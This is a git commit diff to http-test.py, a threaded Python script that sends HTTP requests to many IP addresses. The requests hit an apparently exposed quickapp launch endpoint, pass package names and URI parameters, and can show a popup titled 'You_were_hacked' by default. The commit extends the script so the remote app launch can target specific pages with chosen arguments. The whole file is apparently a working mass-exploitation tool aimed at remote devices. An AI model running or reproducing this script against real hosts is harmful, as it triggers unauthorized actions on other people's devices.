0198d42fbff240c838e2aa74805dfeee4b707343
Droid-MAX <Droid-MAX@users.noreply.github.com>
2023-10-25 16:06:10 +0800

    complete the params for http-test.py

--- http-test.py
+++ http-test.py
@@ -19,7 +19,7 @@ class Parser(argparse.ArgumentParser):
             help="specify ip address (default: 127.0.0.1)"
         )
         group.add_argument(
-            "-l", "--list", dest="ipList", metavar="list",
+            "-f", "--list", dest="ipList", metavar="list",
             help="specify ip list file path (example: ./ips.txt)"
         )
         parser.add_argument(
@@ -31,7 +31,15 @@ class Parser(argparse.ArgumentParser):
             help="specify quickapp package name (default: 1)"
         )
         parser.add_argument(
-            "-s", "--title-name", dest="titleName", metavar="title", default="You_were_hacked",
+            "-s", "--uri-path", dest="uriPath", metavar="path",
+            help="specify request uri path (default: None)"
+        )
+        parser.add_argument(
+            "-d", "--uri-params", dest="uriParams", metavar="params",
+            help="specify request uri params (default: None)"
+        )
+        parser.add_argument(
+            "-t", "--title-name", dest="titleName", metavar="title", default="You_were_hacked",
             help="specify popup message title name (default: 'You_were_hacked')"
         )
         parser.add_argument(
@@ -43,9 +51,11 @@ class Parser(argparse.ArgumentParser):
 opt = Parser().optparse()
 
 ip = opt.ipAddress
-path = opt.ipList
+fp = opt.ipList
 port = opt.portNumber
 pkg_name = opt.packageName
+path = opt.uriPath
+para = opt.uriParams
 popup = opt.promptOn
 title_name = opt.titleName
 
@@ -55,11 +65,19 @@ sema = threading.BoundedSemaphore(value=thread_nums)
 def worker(ip):
     with sema:
         try:
-            r = requests.get("http://{}:{}/?i={}&__PROMPT__={}&__NAME__={}".format(ip, port, pkg_name, int(popup), title_name), timeout=10)
+            if path and para:
+                r = requests.get("http://{}:{}/?i={}&__PROMPT__={}&__NAME__={}&p={}&a={}".format(ip, port, pkg_name, int(popup), title_name, path, para), timeout=10)
+            elif path:
+                r = requests.get("http://{}:{}/?i={}&__PROMPT__={}&__NAME__={}&p={}".format(ip, port, pkg_name, int(popup), title_name, path), timeout=10)
+            elif para:
+                r = requests.get("http://{}:{}/?i={}&__PROMPT__={}&__NAME__={}&a={}".format(ip, port, pkg_name, int(popup), title_name, para), timeout=10)
+            else:
+                r = requests.get("http://{}:{}/?i={}&__PROMPT__={}&__NAME__={}".format(ip, port, pkg_name, int(popup), title_name), timeout=10)
             if r.status_code == 200:
                 print("[+] Sending Request:", ip, flush=True)
             else:
                 print("[-] Request Failed:", ip, flush=True)
+        
         except Exception:
             print("[-] Request Failed:", ip, flush=True)
             pass
@@ -68,9 +86,9 @@ def worker(ip):
 
 def main():
     global ip
-    if path:
+    if fp:
         threads = []
-        with open(path,encoding='utf-8') as f:
+        with open(fp, encoding='utf-8') as f:
             list = f.readlines()
             for line in list:
                 t = threading.Thread(target=worker, args=(line.strip(), ), daemon=True)
